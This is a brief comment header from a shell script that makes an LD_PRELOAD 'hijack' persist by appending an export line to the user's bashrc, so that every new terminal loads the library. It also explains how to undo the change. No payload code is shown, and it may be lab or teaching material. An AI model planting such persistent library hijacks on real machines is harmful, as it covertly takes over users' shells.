# IMPORTANT NOTE: READ ME BEFORE EXECUTING!!!: 
# This Scrip makes the hijack work for every new opened Terminal after execution !!
# 
# How it works: 
#
#   export LD_PRELOAD in ~/bash.rc on the last line
#
# How to undo it:
# 
# remove LD_PRELOAD in ~/bash.rc on the last line
# "nano ~/bash.rc" cnhelp you
#
# "unset LD_PRELOAD" still works but only for the active terminal. 
# In the a new terminal it will be set again.
